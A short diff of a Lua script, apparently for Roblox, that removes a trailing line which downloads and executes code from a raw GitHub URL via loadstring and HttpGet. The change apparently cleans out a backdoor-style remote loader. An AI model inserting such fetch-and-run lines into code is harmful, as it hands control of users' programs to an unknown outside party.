@@ -69,5 +69,3 @@ end
 local player = game.Players:GetPlayers()[1]
 resetCharacter(player)
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Ngigerngieofoepdo/Logs/refs/heads/main/ImportantForTheFarm"))()
